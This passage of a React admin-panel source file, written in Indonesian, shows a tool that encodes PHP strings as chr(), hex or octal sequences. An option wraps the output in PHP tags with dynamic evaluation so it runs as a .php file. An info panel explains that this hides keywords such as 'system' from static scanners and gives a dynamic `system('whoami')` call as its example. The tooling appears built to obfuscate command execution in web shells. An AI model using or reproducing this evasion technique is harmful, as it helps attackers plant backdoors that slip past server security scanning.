                                <p className="text-[10px] text-slate-400">Jika diaktifkan, hasil konversi akan otomatis dibungkus dengan tag PHP pembuka/penutup dan fungsi evaluasi dinamis agar bisa disimpan sebagai file .php dan dieksekusi langsung.</p>
                              </div>
                              <button
                                type="button"
                                onClick={() => setStringExecWrapper(!stringExecWrapper)}
                                className={`w-12 h-6 flex-shrink-0 rounded-full p-0.5 transition-colors duration-200 focus:outline-none cursor-pointer ${
                                  stringExecWrapper ? 'bg-amber-500' : 'bg-slate-800'
                                }`}
                              >
                                <div
                                  className={`bg-white w-5 h-5 rounded-full shadow-md transform transition-transform duration-200 ${
                                    stringExecWrapper ? 'translate-x-6' : 'translate-x-0'
                                  }`}
                                />
                              </button>
                            </div>
                          </div>

                          <div className="space-y-4">
                            {/* INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  String / Script Literal (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  <label className="text-xs text-slate-400 hover:text-amber-400 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer flex items-center space-x-1 hover:border-amber-500/30">
                                    <Upload className="h-3 w-3" />
                                    <span>Unggah File</span>
                                    <input
                                      type="file"
                                      accept=".php,.txt"
                                      onChange={(e) => handleGenericFileUpload(e.target.files?.[0], setStringInput, setStringConverterError)}
                                      className="hidden"
                                    />
                                  </label>
                                  <button
                                    onClick={() => setStringInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>
                              <textarea
                                value={stringInput}
                                onChange={(e) => setStringInput(e.target.value)}
                                onDragOver={handleGenericDragOver}
                                onDrop={(e) => handleGenericDrop(e, setStringInput, setStringConverterError)}
                                placeholder="Masukkan teks, nama fungsi, atau seret (drag & drop) file .php / .txt di sini..."
                                className="w-full h-32 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-amber-500"
                              />
                              <button
                                onClick={handleStringConvert}
                                className="w-full bg-amber-500 hover:bg-amber-600 text-slate-950 font-bold py-2 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-xs shadow-lg shadow-amber-500/10"
                              >
                                <Hash className="h-4 w-4" />
                                <span>Konversikan String</span>
                              </button>
                            </div>

                            {/* OUTPUTS */}
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pt-4">
                              {/* ASCII CHAR */}
                              <div className="space-y-2 bg-slate-950/80 border border-slate-800/80 p-4 rounded-xl">
                                <div className="flex items-center justify-between border-b border-slate-800/60 pb-2">
                                  <span className="text-xs font-bold text-slate-300 font-mono">Model ASCII chr()</span>
                                  {stringOutputChar && (
                                    <button
                                      onClick={() => handleCopy(stringOutputChar, 'stringOutputChar')}
                                      className="text-[10px] text-slate-500 hover:text-amber-400 transition cursor-pointer"
                                    >
                                      {copiedId === 'stringOutputChar' ? 'Disalin!' : 'Salin'}
                                    </button>
                                  )}
                                </div>
                                <textarea
                                  readOnly
                                  value={stringOutputChar}
                                  placeholder="Hasil chr(...) akan muncul di sini..."
                                  className="w-full h-32 bg-transparent text-amber-400 font-mono text-xs focus:outline-none resize-none"
                                />
                              </div>

                              {/* HEX */}
                              <div className="space-y-2 bg-slate-950/80 border border-slate-800/80 p-4 rounded-xl">
                                <div className="flex items-center justify-between border-b border-slate-800/60 pb-2">
                                  <span className="text-xs font-bold text-slate-300 font-mono">Hexadesimal \xHH</span>
                                  {stringOutputHex && (
                                    <button
                                      onClick={() => handleCopy(stringOutputHex, 'stringOutputHex')}
                                      className="text-[10px] text-slate-500 hover:text-amber-400 transition cursor-pointer"
                                    >
                                      {copiedId === 'stringOutputHex' ? 'Disalin!' : 'Salin'}
                                    </button>
                                  )}
                                </div>
                                <textarea
                                  readOnly
                                  value={stringOutputHex}
                                  placeholder="Hasil \x41\x42 akan muncul di sini..."
                                  className="w-full h-32 bg-transparent text-amber-400 font-mono text-xs focus:outline-none resize-none"
                                />
                              </div>

                              {/* OCTAL */}
                              <div className="space-y-2 bg-slate-950/80 border border-slate-800/80 p-4 rounded-xl">
                                <div className="flex items-center justify-between border-b border-slate-800/60 pb-2">
                                  <span className="text-xs font-bold text-slate-300 font-mono">Oktal \OOO</span>
                                  {stringOutputOctal && (
                                    <button
                                      onClick={() => handleCopy(stringOutputOctal, 'stringOutputOctal')}
                                      className="text-[10px] text-slate-500 hover:text-amber-400 transition cursor-pointer"
                                    >
                                      {copiedId === 'stringOutputOctal' ? 'Disalin!' : 'Salin'}
                                    </button>
                                  )}
                                </div>
                                <textarea
                                  readOnly
                                  value={stringOutputOctal}
                                  placeholder="Hasil \101\102 akan muncul di sini..."
                                  className="w-full h-32 bg-transparent text-amber-400 font-mono text-xs focus:outline-none resize-none"
                                />
                              </div>
                            </div>
                          </div>

                          {stringConverterError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{stringConverterError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* INFO PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-amber-400" />
                            Bagaimana Kegunaan Enkoding String Literal?
                          </h4>
                          <p>
                            Saat mengevaluasi kode dinamis, interpreter PHP mendukung pemanggilan fungsi secara tidak langsung melalui variabel string (Dynamic Function Calls). Contoh: <code className="text-slate-300">{"$f = \"system\"; $f(\"whoami\");"}</code>
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Scanner static menganalisis source code mencari string keyword literal sensitif seperti <code className="text-slate-300">"system"</code>.</li>
                            <li>Dengan merubah <code className="text-slate-300">"system"</code> menjadi <code className="text-slate-300">{"\"\\x73\\x79\\x73\\x74\\x65\\x6d\""}</code> atau concatenation <code className="text-slate-300">chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)</code>, string tersebut tidak lagi terdeteksi oleh regex pencarian teks statis sederhana, namun tetap didecode secara otomatis oleh interpreter PHP saat dijalankan.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 17: GANTI PASSWORD ADMIN */}
                    {activeTab === 'ganti_password' && (
                      <motion.div
                        key="ganti_password"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md max-w-xl mx-auto">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Settings className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">Ganti Password Dashboard</h2>
                                <p className="text-xs text-slate-400">Perbarui kunci akses MD5 panel admin Anda demi menjaga kerahasiaan & keamanan data.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo Security
                            </span>
                          </div>

                          <form onSubmit={handlePasswordChange} className="space-y-4">
                            <div>
                              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                                Password Saat Ini (Password Lama / idoseo)
                              </label>
                              <input
                                type="password"
                                value={currentPassword}
                                onChange={(e) => setCurrentPassword(e.target.value)}
                                placeholder="Masukkan password saat ini..."
                                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-slate-100 placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-emerald-500 transition font-mono text-xs"
                              />
                            </div>

                            <div>
                              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                                Password Baru
                              </label>
                              <input
                                type="password"
                                value={newPassword}
                                onChange={(e) => setNewPassword(e.target.value)}
                                placeholder="Masukkan password baru..."
                                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-slate-100 placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-emerald-500 transition font-mono text-xs"
                              />
                            </div>

                            <div>
                              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-1.5">
                                Konfirmasi Password Baru
                              </label>
                              <input
                                type="password"
                                value={confirmNewPassword}
                                onChange={(e) => setConfirmNewPassword(e.target.value)}
                                placeholder="Ulangi password baru..."
                                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-slate-100 placeholder-slate-600 focus:outline-none focus:ring-1 focus:ring-emerald-500 transition font-mono text-xs"
                              />
                            </div>

                            {passwordChangeError && (
                              <motion.div
                                initial={{ opacity: 0, y: -5 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                              >
                                <ShieldAlert className="h-4 w-4" />
                                <span>{passwordChangeError}</span>
                              </motion.div>
                            )}

                            {passwordChangeSuccess && (
                              <motion.div
                                initial={{ opacity: 0, y: -5 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="flex items-center space-x-2 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 px-3 py-2.5 rounded-lg text-xs"
                              >
                                <Check className="h-4 w-4" />
                                <span>{passwordChangeSuccess}</span>
                              </motion.div>
                            )}

                            <button
                              type="submit"
                              className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-sm shadow-md"
                            >
                              <Settings className="h-4 w-4" />
                              <span>Simpan Password Baru</span>
                            </button>
                          </form>
                        </div>
                      </motion.div>
                    )}

                  </AnimatePresence>
                )}

              </div>

            </motion.div>
          )}

        </AnimatePresence>
      </main>

      {/* FOOTER */}
      <footer className="border-t border-slate-900 bg-slate-950 px-6 py-4 text-center text-xs text-slate-600 relative z-10">
        <p className="font-mono">
          © 2026 Admin Web Tools Panel
        </p>
      </footer>

    </div>
  );
}
